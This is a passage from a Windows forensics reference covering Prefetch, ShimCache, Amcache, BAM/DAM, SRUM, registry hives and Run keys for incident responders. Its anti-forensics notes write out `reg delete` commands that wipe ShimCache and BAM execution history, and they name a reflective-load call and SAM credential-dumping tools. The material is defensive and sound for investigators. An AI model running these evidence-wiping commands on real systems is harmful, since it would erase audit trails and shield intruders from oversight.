- **Multiple runs of the same binary** consolidated into one .pf with run-count incremented and history of last 8 timestamps; you do NOT get 8 separate files.
- **Powershell scripts** don't get their own .pf (the .ps1 is not an executable). What you see is `POWERSHELL.EXE-<hash>.pf` with the script in the loaded-files list.
- **WSL binaries** — Linux processes on WSL2 do not produce Windows prefetch.
- **Rundll32 / regsvr32 / mshta** — each gets its own .pf entry with the proxy-loaded DLL/HTA path in the loaded-files list, but the hash is computed against the proxy's path only. Easy to miss the actual malicious DLL without reading the loaded-files list.

**Anti-forensics interactions:**

- **Mass deletion of `*.pf`** — visible in MFT timestamps, often coincides with attacker preparing exfil/cleanup. The Prefetch directory itself remains; its $I30 shows entries that have been deleted.
- **Disabling prefetcher** via registry — only useful pre-attack; doesn't remove existing .pf files. Visible as recent SI change on the `PrefetchParameters` key.
- **Renaming a binary** so the .pf filename doesn't match expected name — still leaves a .pf; just makes searches harder. Many "rename SAB.exe to SVCHOST.exe" attempts leave traces.
- **Running from a path with very long name** — .pf still created with truncated name + hash.
- **Memory-only execution** (reflective load via PowerShell `[Reflection.Assembly]::Load($bytes)`) — the host process (`powershell.exe`) gets a prefetch entry; the loaded payload does not.
- **Running with `RunDll32` or `mshta`** — proxy gets the prefetch; payload name appears only in loaded-files list.

**Cross-corroboration partners:**

- **Amcache.hve** — records every executable's SHA1 + path + first-seen time. Amcache + Prefetch agree -> high confidence execution.
- **ShimCache** — records path + size + last-modified; coarser, but persists longer.
- **Sysmon 1 (process create)** — gold standard for execution; Prefetch is the durable backstop.
- **Security log 4688** (process create with cmd line, if enabled) — same.
- **BAM** — per-user execution time of foreground app activity.
- **UserAssist** — per-user GUI program launches.
- **MFT** — the .pf file itself; its SI-Created time tells when the binary FIRST ran; SI-Modified, when it LAST ran.

---


## 7. ShimCache / AppCompatCache

**Full name:** Application Compatibility Cache, also known as ShimCache (the older name from the Application Compatibility Shim subsystem) or AppCompatCache.

**Path / location:**
- Registry key: `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache`
- The binary value name is `AppCompatCache` (a single REG_BINARY blob).
- Also present in each ControlSet (ControlSet001, ControlSet002, ...) — useful for cross-corroboration.
- Lives only in the SYSTEM registry hive — file at `C:\Windows\System32\config\SYSTEM`.
- **The cache is held in memory while the system is running and only flushed to the registry on clean shutdown.** This is the single most critical operational fact about ShimCache.

**What it records:**

For executable files that the Application Compatibility subsystem evaluated for shimming, ShimCache records:
- Full path (`C:\Path\To\Binary.exe`)
- Last-modified timestamp (from the file's SI, captured at the moment of evaluation)
- Execution flag (Windows 7 and earlier: explicit "Executed" flag; Windows 8/10/11: the flag was removed)
- File size (on some Windows versions)
- Sometimes a hash placeholder (rarely populated)

**Critical subtlety: ShimCache does NOT prove execution.** The cache is populated when the AppCompat layer evaluates a binary for shim applicability, which happens when:
- A binary is executed (most common).
- A binary is browsed in Explorer such that Explorer asks AppCompat to evaluate it.
- AV scans may trigger evaluation.
- Some installers enumerate executables.

The Win7 "Executed" flag distinguished these; Win8+ removed it, so presence in ShimCache on modern Windows means "was prompted for shim evaluation" — which is *usually* execution but not always.

**Retention behavior:**

- Hard cap of **1024 entries** on Windows 7+ (older versions: smaller — XP held 96, Server 2003 held 512).
- LRU eviction when full.
- Entries are added at the front; oldest fall off the back.
- Persistence across reboot: yes — but only those entries that were in memory at the time of clean shutdown.
- Crash / hard power-off: the in-memory cache is lost; only the last clean shutdown's flush is on disk.
- This is why an attacker who has lateral movement may execute many binaries that are visible in memory ShimCache but not yet on disk.

**Format / encoding:**

Binary, versioned by OS:
- Windows XP (32-bit) — header magic `0xDEADBEEF`
- Windows 2003 — different layout, 32-bit
- Vista / Server 2008 — `0xBADC0FEE`
- Windows 7 / Server 2008 R2 — `0xBADC0FEE`, 32-bit OR 64-bit variants
- Windows 8 / Server 2012 — `0x0080` header, 128-byte entry length
- Windows 8.1 — variant with different header
- Windows 10 / 11 — `10ts` magic, variable-length entries with extra fields

Each entry contains: path length, path (UTF-16LE), last-modified FILETIME, flags, optional size.

**Parsers (by name only):**
- `AppCompatCacheParser` (Eric Zimmerman)
- `shimcache.py` (Mandiant — the classic and the namer of the artifact for IR)
- `ShimCacheParser` (Mandiant, alternate)
- Volatility 3 `windows.registry.shimcachemem` — pulls the live in-memory ShimCache from a memory dump, often containing entries not yet flushed to disk
- RECmd (Eric Zimmerman) with batch
- log2timeline/plaso `windows_shim_cache` parser
- Sleuth Kit registry tools (limited)
- KAPE has dedicated extraction

**Canonical forensic insight:**

ShimCache is **the durable execution-or-prompt-evaluation record** that survives even when:
- Prefetch has been deleted or disabled.
- Amcache has been cleared.
- The binary itself has been wiped.

Its 1024-entry depth often goes back weeks to months on a workstation. Its presence in `ControlSet001` AND `ControlSet002` (the current and previous control sets, swapped at boot) is a powerful cross-check — if an entry appears in 001 but not 002, it was added since the last reboot.

**Memory ShimCache (Volatility's `shimcachemem`)** is the killer technique for live-response: by reading process memory of the kernel-resident cache, you can see entries that haven't yet been flushed to the registry. This frequently captures attacker tooling that ran but the system hasn't rebooted yet.

**Known gotchas:**

- **In-memory only until shutdown.** If you take a forensic disk image of a *running* system (e.g., via a live USB tool), the on-disk SYSTEM hive does NOT have the latest entries. You need a memory acquisition + `shimcachemem`, or a clean shutdown before imaging.
- **"Executed" flag does not exist on Win8+.** Older write-ups and parsers that report "Executed: True/False" on a Win10 image are reporting garbage.
- **Last-modified timestamp is from the FILE's SI**, not the time of execution. ShimCache does NOT record when the binary ran; it records the file's modified time at the moment ShimCache evaluated it. To estimate "when did this run," you correlate with surrounding entries (entries before/after in LRU order) and with other artifacts.
- **Position in the cache is informative.** Top entries = most recently inserted. Counting from the top gives "rough relative ordering of recent executions."
- **Path may be the network UNC path** for binaries run from a share. Useful for lateral movement detection.
- **ControlSet quirks.** Changes are applied to whichever ControlSet is "current"; cross-control-set diffing is a known technique.
- **`HKLM\SYSTEM\CurrentControlSet` is a symlink** to the active ControlSet number — depends on which boot.
- **Wow6432Node** does not apply here — ShimCache lives at a single location.
- **Server vs client.** Servers with no logon activity may have a small, stale cache; workstations are richer.
- **Sysmon process events do not appear here.** ShimCache is filesystem-derived, not process-derived; the two should agree but each has gaps the other fills.

**Anti-forensics interactions:**

- **Reboot without clean shutdown** (e.g., crashing or hard power-off) prevents the in-memory cache from flushing. Attackers exploiting this is rare and visible (system event 41 — Kernel-Power unexpected shutdown).
- **Clearing the registry value** — `reg delete HKLM\SYSTEM\ControlSet001\Control\Session Manager\AppCompatCache /v AppCompatCache` — removes the cache. Visible by registry key last-write time on the parent key and by ControlSet002 still containing prior entries.
- **Path obfuscation** — running binaries via UNC, junctions, or DOS device paths to alter the path stored. ShimCache stores what AppCompat sees, which may differ from what process-creation events log.
- **Running binaries from paths that don't trigger AppCompat** — extremely rare; the subsystem evaluates virtually all PE files.
- **In-memory-only execution** (reflective load) — payload is not a file on disk; ShimCache only records the host (e.g., `powershell.exe`).

**Cross-corroboration partners:**

- **Amcache.hve** — records every PE the system saw, with SHA1 + publisher + path + first-seen. Amcache + ShimCache agree -> very high confidence.
- **Prefetch** — confirms actual execution; ShimCache may have "prompted for shim only."
- **Sysmon 1, Security 4688** — process creation, gold standard.
- **MFT** — confirms the file exists / existed.
- **VSS shadows** — older SYSTEM hives may have entries that have since fallen off the LRU.

---

## 8. Amcache.hve

**Full name:** Application Compatibility Cache hive — a separate registry hive (not part of the main SYSTEM hive) used by the AppCompat subsystem to inventory PE files. Predecessor: `RecentFileCache.bcf` (Windows 7).

**Path / location:**
- File: `C:\Windows\AppCompat\Programs\Amcache.hve`
- Transaction logs: `Amcache.hve.LOG1`, `Amcache.hve.LOG2`
- Older systems: `C:\Windows\AppCompat\Programs\RecentFileCache.bcf` (Win 7) — replaced by Amcache in Win 8.
- Mounted at `HKLM\Amcache` only when accessed by the Compatibility Telemetry service.

**What it records:**

Per-PE inventory entries under several keys:
- `Root\InventoryApplicationFile\<name>|<hash>` — one per unique PE encountered. Values include:
  - `LowerCaseLongPath` — full path to the binary (lowercase)
  - `Name`, `OriginalFileName`, `Version`, `BinFileVersion`, `BinProductVersion`
  - `Publisher`, `ProductName`, `ProductVersion`
  - `Size`
  - `FileId` — SHA-1 hash of the binary prefixed with `0000`
  - `LinkDate` — compile timestamp from the PE header
  - `IsPeFile`, `IsOsComponent` — booleans
  - `Language`, `BinaryType`
  - `Usn`
- `Root\InventoryApplication\<id>` — entries describing applications (installed programs).
- `Root\InventoryDeviceContainer`, `Root\InventoryDevicePnp` — hardware inventory.
- `Root\InventoryDriverBinary` — drivers.
- `Root\InventoryApplicationShortcut` — shortcuts.

**The KeyLastWriteTimestamp is the key signal:** registry keys have a last-write time. For an InventoryApplicationFile entry, the key's last-write time approximates "when this binary was first seen and inventoried by the Compatibility Telemetry service."

**Retention behavior:**

- No fixed entry cap (unlike ShimCache's 1024) — the hive grows.
- Persistence: across reboots, yes.
- Reset by uninstall of Compatibility Telemetry, Windows feature updates (sometimes), aggressive cleanup tools.
- Compatibility Telemetry service writes entries periodically (every ~24h scheduled task: `Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser`).

**Format / encoding:**

Standard Windows registry hive format (NT5 hive — same format as SOFTWARE, SYSTEM, NTUSER.DAT). 4 KB pages, signature `regf`. Transaction logs (.LOG1/.LOG2) follow the modern hive log format used since Windows 8.1, with `HvLE` blocks.

**Parsers (by name only):**
- `AmcacheParser` (Eric Zimmerman)
- `amcache.py` (Mandiant)
- RegRipper plugins (`amcache.pl`)
- Volatility 3 `windows.registry.amcache`
- log2timeline/plaso `amcache` parser
- python-registry (Willi Ballenthin)
- KAPE has dedicated extraction module

**Canonical forensic insight:**

Amcache is **the single richest "every binary that ever ran or was inventoried" artifact** on modern Windows. It gives you:
- SHA1 for free — no need to re-hash the binary, and the binary may no longer exist.
- Publisher / signing info — distinguishes Microsoft-signed from unsigned.
- First-seen timestamp (key last-write) — approximate landing time.
- PE compile timestamp — helps identify recently-built attacker tooling.

For an analyst running "did binary X with SHA1 Y ever exist on this host?" Amcache is the first stop.

**Known gotchas:**

- **KeyLastWriteTimestamp ≠ execution time.** It is roughly "when the Compatibility Appraiser inventoried this binary," which usually happens within ~24h of first execution or first file-system presence (depending on whether AppCompat saw it). NOT a precise execution timestamp.
- **Amcache may include binaries that were NEVER executed.** The Appraiser scheduled task scans installed apps and PE files; presence in Amcache means "was inventoried." This is the same fundamental subtlety as ShimCache. Cross-corroboration with Prefetch / Sysmon is needed for execution proof.
- **SHA1, not SHA256.** Amcache stores SHA-1; modern IOC formats use SHA-256. You may need to translate via VirusTotal or recomputing if the binary is still on disk.
- **The hash field is prefixed with "0000"** — sometimes parsers leave this in; sometimes strip. Confirm format before joining to IOC sets.
- **Schema changed across Windows versions.** Win 8 / 8.1 / 10 1507 / 10 1607 / 10 1709+ / 11 each have schema differences. Older parsers may miss fields or misinterpret on newer hives.
- **Path may be lowercase ASCII** even when the real path has different case. The volume identifier may be a serial number rather than letter on some Win10 versions.
- **InventoryApplicationFile vs. InventoryApplication** — the former is a PE file inventory, the latter is "this looks like an installed app." Don't confuse.
- **Programs key (legacy)** — older Win8 layout used `Root\Programs\<GUID>` and `Root\File\<volume>\<MFTseq>`. Modern Win10/11 uses `Root\InventoryApplicationFile`.
- **The hive may be locked open** by a running Compatibility Telemetry process during live response. KAPE/FastIR handles this via volume shadow or VSS.

**Anti-forensics interactions:**

- **Deleting Amcache.hve + logs** — destructive; the file is regenerated at next Appraiser run. Visible by SI-Created on Amcache.hve matching post-attack.
- **Disabling the Microsoft Compatibility Appraiser scheduled task** — prevents new inventory. Visible by Task Scheduler logs.
- **Group Policy: disabling telemetry** — also disables Amcache. In some enterprise builds, Amcache is empty.
- **Renaming binary before execution** — Amcache records the path at the time of inventory; rename after the fact is recorded as a new entry on next scan.
- **In-memory execution** — payload never hits disk, never appears in Amcache.
- **Wiping individual InventoryApplicationFile entries** via `reg delete` — possible but visible as reduced count vs. ShimCache. Key delete leaves transaction-log forensics in `.LOG1/.LOG2`.

**Cross-corroboration partners:**

- **ShimCache** — overlapping but different. Amcache has hash + publisher; ShimCache has 1024-entry LRU position.
- **Prefetch** — confirms execution at a specific timestamp.
- **Sysmon 6 (driver load)** — if the Amcache entry is a driver, Sysmon 6 corroborates.
- **MFT** — the binary's MFT FILE record + Amcache's SHA1 + first-seen.
- **VSS** — older Amcache hives, useful for "this binary appeared after date X."

---

## 9. BAM / DAM — Background / Desktop Activity Moderator

**Full name:** Background Activity Moderator (BAM) and Desktop Activity Moderator (DAM). Windows 10/11 services that throttle background apps for power efficiency.

**Path / location:**
- BAM: `HKLM\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\<SID>` (older versions: `HKLM\SYSTEM\CurrentControlSet\Services\bam\UserSettings\<SID>`).
- DAM: `HKLM\SYSTEM\CurrentControlSet\Services\dam\State\UserSettings\<SID>` (same layout, less commonly populated).
- Hive: SYSTEM.
- Per-SID subkey under UserSettings — each user who has run foreground apps gets a SID-named subkey.

**What it records:**

Under each SID, one registry value per executable path the user has run. The value:
- Name = full path to the binary (e.g., `\Device\HarddiskVolume3\Windows\System32\notepad.exe`)
- Type = REG_BINARY
- Data = 24 bytes (older versions: shorter):
  - Bytes 0–7 = last execution time (FILETIME, UTC)
  - Bytes 8–23 = padding / reserved fields

So: BAM = per-user, per-binary "last time this binary was foreground."

**Retention behavior:**

- One entry per binary path per user.
- Apparently no hard cap observed; entries persist as long as the user account exists and BAM hasn't been reset.
- Updated on each foreground launch — last-execution time overwritten.
- Cleared on user account deletion.
- Survives reboot.

**Format / encoding:**

Registry binary value. Times are FILETIME (100ns ticks since 1601 UTC). Path uses the NT device path (`\Device\HarddiskVolumeN\...`) — not the DOS path (`C:\...`). Translation requires reading the `\GLOBAL??\` symbolic links or `HKLM\SYSTEM\MountedDevices`.

**Parsers (by name only):**
- `bam_parser.py` (Mark Baggett / Costas Katsavounidis)
- RegRipper plugin `bam.pl`
- log2timeline / plaso `bam` parser
- RECmd (Eric Zimmerman)
- Manual reading of registry with any hive viewer

**Canonical forensic insight:**

BAM is **the per-user "last execution timestamp" artifact** with per-binary granularity. It is concise, easy to parse, and survives unless the user account is removed. Where ShimCache is system-wide and Amcache is system-wide, BAM ties an execution to a specific user SID — useful for multi-user systems and for distinguishing administrator activity from regular user activity.

Strongest use:
- "Did user X run binary Y on this host, and when?"
- Anchoring a suspect process to a specific user account.
- Cross-checking against Prefetch (which is system-wide) to determine WHICH user ran the binary.

**Known gotchas:**

- **Foreground apps only.** Pure background services / scheduled tasks may not produce a BAM entry. Console apps launched via runas/PsExec may or may not register depending on whether they have a foreground window.
- **Device path, not DOS path.** Mapping `\Device\HarddiskVolume3` to `C:\` requires either the running system or MountedDevices reading.
- **SID resolution.** You need the SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList to translate SID -> username.
- **Wow6432Node and System32 redirection** can produce two separate paths for what is effectively the same binary.
- **Removed from Server 2019/2022** — some server SKUs don't have BAM populated, or only sparsely.
- **Confusion with DAM** — they're sibling services; DAM is usually empty or near-empty in practice.
- **Older Windows 10 builds** stored under different subkey path. Tools must accommodate both.

**Anti-forensics interactions:**

- **Clearing the registry key** — `reg delete HKLM\SYSTEM\ControlSet001\Services\bam\State\UserSettings\<SID> /f` — wipes that user's history. Visible by key last-write on parent.
- **Running everything as a different user (SYSTEM)** — bypasses per-user logging; but BAM still records under SYSTEM's SID (S-1-5-18).
- **In-memory execution from PowerShell** — the PowerShell.exe foreground entry is what BAM sees.
- **Restarting / deleting the BAM service** — possible but visible (event log 7045, 7036 in System log).

**Cross-corroboration partners:**

- **Prefetch** — system-wide execution + per-execution timestamps.
- **Amcache** — first-seen + hash.
- **Security 4688** — full command-line if enabled.
- **UserAssist** — GUI-launched programs per user.
- **SRUM** — application resource usage per user.

---

## 10. SRUM — System Resource Usage Monitor

**Full name:** System Resource Usage Monitor. Backing database for Windows' "Data Usage" / "Battery usage" / "Resource Monitor" features.

**Path / location:**
- Database: `C:\Windows\System32\sru\SRUDB.dat` (ESE/Jet Blue database).
- Transaction logs: `C:\Windows\System32\sru\*.log`, `*.jrs` (reserved logs).
- Checkpoint: `*.chk`.
- Service: Diagnostic Policy Service (DPS) + Sysmain (formerly Superfetch) interact with SRUM.
- Registry config: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SRUM\Extensions\` lists registered providers (each with GUID).

**What it records:**

SRUDB.dat is an ESE database with multiple tables, one per "extension" (provider GUID):

- `{D10CA2FE-6FCF-4F6D-848E-B2E99266FA89}` — **Application Resource Usage** (per-app: CPU time foreground/background, working set, bytes read/written disk, etc.)
- `{D10CA2FE-6FCF-4F6D-848E-B2E99266FA86}` — **Application Resource Usage v1** (older variant)
- `{973F5D5C-1D90-4944-BE8E-24B94231A174}` — **Network Data Usage** (per-app, per-interface: bytes sent, bytes received)
- `{DD6636C4-8929-4683-974E-22C046A43763}` — **Network Connections** (interface up/down events)
- `{FEE4E14F-02A9-4550-B5CE-5FA2DA202E37}` — **Energy Usage**
- `{FEE4E14F-02A9-4550-B5CE-5FA2DA202E37}LT` — **Energy Usage Long-Term**
- `{B6D82AF1-F780-4E17-8077-6CB9AD8A6FC4}` — **Tagged Energy Provider**
- `{5C8CF1C7-7257-4F13-B223-970EF5939312}` — **App Timeline Provider** (foreground time, focus time)
- `{C5D02D6A-D4D2-4F2D-A0F4-C03A9B3E0F76}` — **Vfu** (virtual machine usage; rare)
- `{DC3D3B50-BB90-5658-82FE-64B1F1F1AF05}` — **Push Notification Data**

Each row links to:
- A timestamp bucket (typically hourly aggregation — SRUM writes summaries every 60 minutes).
- An `AppId` (foreign key into the `SruDbIdMapTable` which maps to the full executable path).
- A `UserId` (foreign key into `SruDbIdMapTable` for user SID).

**Retention behavior:**

- Default retention: ~30 days, sometimes longer on systems with low write activity.
- Database grows; periodically truncated by maintenance.
- Persistence across reboot: yes.
- Persistence across user logout: yes.
- Writes happen on a schedule (~hourly) plus opportunistically; **recent activity is in memory and may not be flushed to disk** at the moment of imaging — same gotcha as ShimCache. A live system imaged abruptly may have data missing.

**Format / encoding:**

ESE / JET Blue (Extensible Storage Engine) database — the same engine used by Active Directory's NTDS.dit and by Exchange. Pages typically 32 KB. Multiple tables; one row per <bucket, app, user, provider>.

The `SruDbIdMapTable` is the master ID-to-string table; everything else references AppIds and UserIds defined there. AppIds are stored either as direct path strings or as hashes pointing to longer entries.

**Parsers (by name only):**
- `srum-dump` (Mark Baggett) — Excel/CSV export, gold standard
- `SRUM-Parser` (Various — Python)
- ESEDatabaseView (Nirsoft) — generic ESE viewer
- log2timeline / plaso `srum` parser
- libesedb (Joachim Metz) — generic ESE library underlying many parsers
- Volatility plugin (limited)
- KAPE module

**Canonical forensic insight:**

SRUM is **the exfil-sizing artifact** — and one of the most powerful for activity reconstruction generally. For each application that ran during the retention window, you can answer:

- How many bytes did this process send/receive over each network interface? (Network Data Usage)
- How much CPU did it use? (Application Resource Usage)
- How long was it in foreground? (App Timeline)
- Which user was logged in when it ran? (UserId)
- Exactly which interface (WiFi vs Ethernet vs VPN)? (Network Connections)

For ransomware exfil investigations, SRUM may tell you "rclone.exe sent 47.3 GB out the wifi interface between 2026-05-22 02:00 and 2026-05-22 04:00." For lateral movement, SRUM shows whether powershell.exe used the network.

**Known gotchas:**

- **Hourly buckets, not per-event.** SRUM aggregates; a 2-minute burst of 50 GB exfil appears as a single hour-row of 50 GB.
- **AppId mapping must be resolved.** Raw rows reference AppId integers; you need SruDbIdMapTable to translate.
- **AppId mapping is per-database — not a stable global ID.** Don't compare AppIds across hosts.
- **In-memory data not flushed.** Live response gotcha — last hour of activity may be unsynced.
- **Database is sometimes locked.** A live database write is in progress; tools that don't handle ESE transaction logs may yield partial / corrupted data. The `.jrs`/`.log` files must be available and replayed.
- **User SID may not be present** for some providers; rows for system services have S-1-5-18 (SYSTEM) often.
- **Path resolution.** AppIds may be MS Store package family names, full file paths, or display names — the format varies by provider.
- **Bytes sent/received** include any retransmissions / protocol overhead; treat as approximate.
- **30-day default is approximate.** Some systems have 60+ days; servers and high-activity workstations may have <30.
- **Windows Server**: SRUM is present but Network Data Usage provider may be sparser.

**Anti-forensics interactions:**

- **Disabling Diagnostic Policy Service / Sysmain** — stops SRUM writes. Visible in System event log (7036).
- **Deleting SRUDB.dat + logs** — wipes the database; recreated on service restart but empty. Visible by SI on the .dat file and by the service event.
- **Sysprep / Windows reset** — wipes SRUM.
- **Running exfil under a different process name** — SRUM records the AppId which maps to the actual exe path; renaming doesn't help.
- **Routing through a different interface** — recorded against the new interface; doesn't hide bytes.
- **Sub-hourly bursts** that fit within a single bucket are aggregated; the granularity is hour, not minute. This is "anti-forensics by Windows design," not by attacker design.

**Cross-corroboration partners:**

- **Firewall log** (`pfirewall.log`) — per-connection records (if logging enabled).
- **netstat snapshots** / Sysmon 3 (network connect) — per-event network detail.
- **Prefetch** — confirms execution at higher resolution than SRUM's hourly bucket.
- **BAM** — last-execution time per user.
- **WebCacheV01.dat** — for browser-based exfil, the Edge/IE web cache has request URLs.
- **Account logs** (4624/4634) — to reconcile which user was at the console during the SRUM bucket.

---

## 11. Registry Hives — SYSTEM, SOFTWARE, SAM, SECURITY, NTUSER.DAT, UsrClass.dat

**Full name:** Windows Registry. A hierarchical, transactional, binary database of configuration data, with a long forensic history (the registry has been a primary investigative target since Windows 2000). On disk, the registry is not a single file — it is a set of "hives," each a separate file with its own transaction logs.

**Path / location:**
- `HKLM\SYSTEM` → `C:\Windows\System32\config\SYSTEM`
- `HKLM\SOFTWARE` → `C:\Windows\System32\config\SOFTWARE`
- `HKLM\SAM` → `C:\Windows\System32\config\SAM`
- `HKLM\SECURITY` → `C:\Windows\System32\config\SECURITY`
- `HKLM\HARDWARE` → in-memory only; not on disk
- `HKLM\BCD00000000` → `\Boot\BCD` (EFI System Partition on UEFI; `\Boot` on BIOS)
- `HKU\<SID>` → `C:\Users\<username>\NTUSER.DAT`
- `HKU\<SID>_Classes` → `C:\Users\<username>\AppData\Local\Microsoft\Windows\UsrClass.dat`
- `HKU\.DEFAULT` → `C:\Windows\System32\config\DEFAULT`
- Amcache → `C:\Windows\AppCompat\Programs\Amcache.hve` (covered separately in §8)
- Transaction logs: each hive has a `.LOG1` and `.LOG2` sibling (Windows 8.1+) — these are NOT optional. A hive without its logs may be inconsistent (mid-transaction).
- Backup copies: `C:\Windows\System32\config\RegBack\` (deprecated and empty by default on Windows 10 v1803+; on older systems holds nightly hive backups).
- Volume Shadow Copies (§5) hold historical hive snapshots.

**What it records:**

The registry stores Windows and application configuration as keys (containers) holding values (typed name/data pairs). Each hive scopes a different concern:

- **SYSTEM** — services, drivers, mounted devices, network configuration, control sets (`Select` key identifies the "current" set; multiple `ControlSet00N` are kept as fallback), USB device chain (`USBSTOR`, `Enum\USB`, `MountedDevices`), time zone information, computer name, BAM/DAM (§9), and the persistent ShimCache (§7).
- **SOFTWARE** — installed applications, Windows components, autorun keys (`Microsoft\Windows\CurrentVersion\Run`), uninstall metadata, network profiles (`Microsoft\Windows NT\CurrentVersion\NetworkList`), Windows Update history, OS version and install date, registered users, EnumeratedDevices, .NET versions, language packs, and more.
- **SAM** — local Security Accounts Manager. Holds local user accounts, group memberships, NTLM password hashes (encrypted with a system key derived from SYSTEM\SAM\SAM\Domains\Account\F), last logon, password set times, login counts, account flags (disabled, locked, password-never-expires), and per-user RIDs. Protected with strict ACLs; not readable while Windows is running except by SYSTEM. The Mimikatz / secretsdump / Impacket family of tools dump SAM hashes by reading this hive plus SYSTEM (for the boot key).
- **SECURITY** — LSA secrets, cached domain credentials (DCC2 / MS-CACHE v2 hashes), audit policy. DPAPI master keys are referenced here. Like SAM, locked behind ACLs.
- **NTUSER.DAT** — per-user configuration: HKCU\Software\..., Run keys (HKCU variant), UserAssist (§27), RecentDocs, TypedURLs, TypedPaths, MUICache (§27), OfficeMRU, RDP MRU (`Terminal Server Client\Servers`), Outlook profile, mapped network drives (`Network`), shellbags (§23 — partial; many shellbags live in UsrClass.dat).
- **UsrClass.dat** — per-user "Classes" hive. The dominant home of modern ShellBags (`Local Settings\Software\Microsoft\Windows\Shell\BagMRU` and `Bags`), Photos app history, default file associations under HKCU.
- **DEFAULT** — applied to new user profiles; rarely investigatively interesting except as a baseline.

**Format / encoding:**

Binary, structured as a sequence of 4 KB "hbins" (hive bins), each holding a tree of cells. Each cell is either a `nk` (key), `vk` (value), `sk` (security descriptor), `lf`/`lh`/`li`/`ri` (subkey index), or `db` (data block for large values). Hive headers are signed with the magic `regf`. Every cell type begins with a signature visible in a hex viewer (e.g., `nk\x20\x00`).

Transaction logs (`.LOG1`/`.LOG2`) hold dirty hbins that have been written-ahead but not yet flushed to the primary hive. Recovering a dirty hive without the logs yields stale data — modern parsers replay logs.

Values are typed: `REG_SZ` (UTF-16LE string), `REG_EXPAND_SZ` (string with %ENV% expansion), `REG_MULTI_SZ` (double-null-terminated list), `REG_DWORD`, `REG_QWORD`, `REG_BINARY`, `REG_NONE`. Many forensic-rich values are `REG_BINARY` blobs with structured contents (ShimCache, ShellBags, UserAssist) — each requires its own parser.

Every key has a "last write" FILETIME — the timestamp of the most recent change to ANY value within that key. Values themselves have no individual timestamp. This is a constant analytical limit: the key tells you when something changed, not which value.

**Retention:**

The registry persists indefinitely — keys remain until deleted or the hive is reset. The `.LOG` files cycle quickly. Volume Shadow Copies (§5) provide point-in-time hive snapshots for delta analysis.

**Parsers (by name only):**
- Eric Zimmerman's `Registry Explorer` (GUI, hive viewer with bookmarks for known forensic keys) and `RECmd` (CLI, batch files for known artifacts)
- RegRipper (Harlan Carvey) — Perl-based, plugin-driven, the long-standing standard
- `regipy` (Martin Korman / Maor Schwartz, Python) — programmatic access
- `python-registry` (William Ballenthin, Python)
- libregf / `regfinfo` (Joachim Metz)
- Yarp (Maxim Suhanov, Python)
- Hivex (libguestfs project)
- log2timeline / plaso registry parsers
- AccessData Registry Viewer (legacy), commercial tools (X-Ways, EnCase, Magnet AXIOM)

**Canonical forensic insight:**

The registry is the "second filesystem" — Windows uses it for almost everything that isn't a file. For investigators it is the canonical source for:

- **Persistence** — Run/RunOnce, Services, Image File Execution Options, AppInit_DLLs, WMI subscriptions, Winlogon Shell/Userinit, Scheduled Tasks (partially), COM hijacks. Practically every persistence mechanism touches at least one registry key.
- **Execution evidence** — ShimCache, Amcache, UserAssist, MUICache, BAM/DAM, RecentDocs, MUICache, Tracing keys, AppCompat triage telemetry.
- **User behavior** — TypedURLs, TypedPaths, RecentDocs, ComDlg32, RunMRU, ShellBags, RDP MRU.
- **System configuration changes** — last-write times on Services keys reveal when a service was installed or modified.
- **Account information** — SAM RID 500/501/1000+ accounts; F and V values hold encrypted password material; last logon times.

**Gotchas / analytical traps:**

- **Key last-write only, no per-value timestamps.** A single value change updates the parent key's timestamp; you cannot tell which value changed.
- **Dirty hives.** Loading a hive without its `.LOG1`/`.LOG2` may miss the most recent writes — parsers vary in their log-replay quality.
- **CurrentControlSet vs ControlSet00X.** `CurrentControlSet` is a runtime alias; on a dead hive, look at the `Select` key (Current, Default, Failed, LastKnownGood values) to identify which ControlSet was current. Always check ALL ControlSet00X copies — an attacker may modify one and leave the others as decoys.
- **Reflected keys (WoW64).** 32-bit apps on 64-bit Windows see `Wow6432Node` reflections. A persistence value placed there is invisible to 64-bit tools that don't traverse it.
- **Symbolic links** within the registry (`REG_LINK`). The HKCU/HKCR mounts are link-based at runtime; on disk you only see the underlying hives.
- **Per-user SID hives load on demand.** A profile's NTUSER.DAT only mounts under HKU when that user is logged on. A dead-disk image gives access to all profiles by parsing the files directly.
- **VSS hive snapshots** can be hours/days/weeks old depending on volume activity — diffing them is one of the strongest registry techniques.
- **Hive header timestamps.** The regf header's "last written" time can be useful for sanity-check (when was this hive flushed?).
- **Permissions matter on a live system.** SAM/SECURITY require SYSTEM-level access; offline analysis is unconstrained.
- **Default vs explicit values.** A missing value isn't the same as a value set to empty.
- **Unicode in key/value names.** Older parsers stumble on non-ASCII names; attackers occasionally rely on this.

**Anti-forensics interactions:**

- **Direct hive editing** with offline tools (libregf, regipy) can produce unrecoverable inconsistencies between the hive and its logs.
- **NULL-byte tricks** in value names — appending characters that the Windows API truncates while the on-disk hive preserves them. Microsoft has patched several variants.
- **Deleted-but-recoverable cells** — RegRipper, regipy, and Registry Explorer can extract `nk` and `vk` cells that have been freed but not overwritten, recovering deleted persistence keys.
- **Hidden by ACL** — placing a key with a deny-everyone ACL hides it from `regedit.exe` but not from offline parsers.
- **Log file destruction** — deleting `.LOG1`/`.LOG2` while leaving the hive can desync subsequent writes; chkdsk may attempt to repair.
- **Stealing the hive entirely** (offline pass-the-hash workflow) leaves no immediate trace except the access that grabbed it (raw read of `C:\Windows\System32\config\SAM` requires SYSTEM and may show in Sysmon 11/24 or Security 4663 if auditing is enabled).

**Cross-corroboration partners:**

- **Event log** — Security 4657 (registry value changed, if auditing enabled), Sysmon 12/13/14 (registry events).
- **Amcache** — registry-format itself, but often examined separately.
- **Prefetch** — corroborates execution implied by run keys.
- **VSS** — older hive snapshots.
- **$UsnJrnl** — entries for hive file writes (rare; the registry uses memory-mapped I/O for most writes).

---

## 12. Run / RunOnce Keys (Autoruns Taxonomy)

**Full name:** No single name — the umbrella term is "autostart extensibility points" (ASEPs). Sysinternals' `Autoruns` and `Autorunsc` enumerate ~150 such locations across registry, filesystem, services, scheduled tasks, COM, drivers, providers, codecs, and protocol handlers. The Run/RunOnce family is the most well-known subset.

**Locations (registry — primary):**

Per-machine:
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
